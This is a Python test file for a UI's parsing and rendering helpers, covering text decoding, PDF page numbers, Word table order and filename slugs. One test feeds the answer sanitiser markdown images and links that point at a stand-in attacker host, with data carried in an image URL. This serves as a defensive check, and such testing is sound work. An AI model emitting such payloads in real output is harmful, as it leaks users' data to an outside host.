"""UI-side parsing and rendering helpers (ui/ is not a package; import by path)."""

import io
import sys
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "ui"))

import docx
from file_parser import _decode, parse_file
from text import safe_answer, slugify

# --- decoding ---------------------------------------------------------------


def test_cp1252_text_with_even_byte_length_is_not_read_as_utf16():
    raw = "Cafe budget: €4.2m for the Q3 review".encode("cp1252")
    assert len(raw) % 2 == 0
    assert _decode(raw) == "Cafe budget: €4.2m for the Q3 review"


def test_cp1252_euro_sign_survives_odd_byte_length():
    raw = "Cafe budget: €4.2m for the Q3 review.".encode("cp1252")
    assert _decode(raw) == "Cafe budget: €4.2m for the Q3 review."


def test_utf8_and_utf16_with_bom_decode_correctly():
    text = "Parental leave: 26 weeks – full pay"
    assert _decode(text.encode("utf-8")) == text
    assert _decode(text.encode("utf-8-sig")) == text
    assert _decode(text.encode("utf-16")) == text  # Python writes a BOM


# --- PDF page numbers -------------------------------------------------------


def test_pdf_keeps_real_page_numbers_when_a_blank_page_is_skipped():
    pages = [SimpleNamespace(extract_text=lambda t=t: t) for t in ("first page", "", "third page")]
    with patch("pypdf.PdfReader", return_value=SimpleNamespace(pages=pages)):
        parsed = parse_file("report.pdf", b"%PDF-stub")
    assert [p["page_number"] for p in parsed.pages] == [1, 3]
    assert parsed.pages[1]["content"] == "third page"


# --- Word documents ---------------------------------------------------------


def test_docx_keeps_tables_in_body_order():
    document = docx.Document()
    document.add_paragraph("Intro before the table")
    table = document.add_table(rows=1, cols=2)
    table.rows[0].cells[0].text = "Q3 revenue"
    table.rows[0].cells[1].text = "4.62m"
    document.add_paragraph("Closing remarks after the table")
    buffer = io.BytesIO()
    document.save(buffer)

    text = parse_file("report.docx", buffer.getvalue()).pages[0]["content"]

    assert text.index("Intro") < text.index("Q3 revenue | 4.62m") < text.index("Closing")


# --- rendering and ids ------------------------------------------------------


def test_safe_answer_drops_images_and_link_targets_but_keeps_citations():
    text = (
        "Revenue was 4.62m [1]. ![chart](https://evil.example/c?d=4.62m) "
        "See [the plan](https://evil.example/x) and ![ref][r].\n[r]: https://evil.example/y"
    )
    safe = safe_answer(text)
    assert "evil.example" not in safe
    assert "[1]" in safe
    assert "chart" in safe and "the plan" in safe


def test_slugify_keeps_the_extension():
    assert slugify("Report.pdf") == "report-pdf"
    assert slugify("report.docx") == "report-docx"
    assert slugify("Report.pdf") == slugify("report.PDF")  # stable across case
